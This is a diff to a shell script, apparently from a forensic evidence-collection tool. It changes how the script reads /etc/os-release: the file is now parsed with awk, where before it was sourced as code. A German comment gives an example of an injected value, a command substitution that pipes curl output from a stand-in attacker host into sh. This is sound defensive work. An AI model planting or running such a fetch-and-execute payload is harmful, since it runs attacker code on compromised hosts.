@@ -47,12 +47,35 @@ UID_=$(id -u 2>/dev/null || printf '?')
 
 OS_NAME="unknown"
 OS_VERSION="unknown"
+
+# /etc/os-release wird GEPARST, nicht gesourct.
+#
+# `. /etc/os-release` fuehrt die Datei als Shell-Code aus. Auf einem
+# kompromittierten Host — also genau dem Fall, fuer den dieses Werkzeug
+# existiert — kann dort beliebiges Kommando stehen:
+#   NAME="x$( curl -s http://angreifer/p | sh )"
+# Das liefe dann mit root-Rechten mitten in der Beweissicherung und
+# widerspraeche der ersten Regel des Skills ("nur lesen"). Nichts von einem
+# untersuchten System darf als Code ausgefuehrt werden.
+hf_osrelease_value() {
+  [ -r /etc/os-release ] || return 1
+  LC_ALL=C awk -F= -v key="$1" '
+    $1 == key {
+      v = substr($0, index($0, "=") + 1)
+      sub(/^"/, "", v); sub(/"$/, "", v)
+      sub(/^'"'"'/, "", v); sub(/'"'"'$/, "", v)
+      print v
+      exit
+    }' /etc/os-release 2>/dev/null
+}
+
 case "$OS" in
   linux)
     if [ -r /etc/os-release ]; then
-      # shellcheck disable=SC1091
-      OS_NAME=$(. /etc/os-release 2>/dev/null && printf '%s' "${NAME:-unknown}")
-      OS_VERSION=$(. /etc/os-release 2>/dev/null && printf '%s' "${VERSION_ID:-${VERSION:-unknown}}")
+      OS_NAME=$(hf_osrelease_value NAME); [ -n "$OS_NAME" ] || OS_NAME="unknown"
+      OS_VERSION=$(hf_osrelease_value VERSION_ID)
+      [ -n "$OS_VERSION" ] || OS_VERSION=$(hf_osrelease_value VERSION)
+      [ -n "$OS_VERSION" ] || OS_VERSION="unknown"
     fi
     ;;
   darwin)
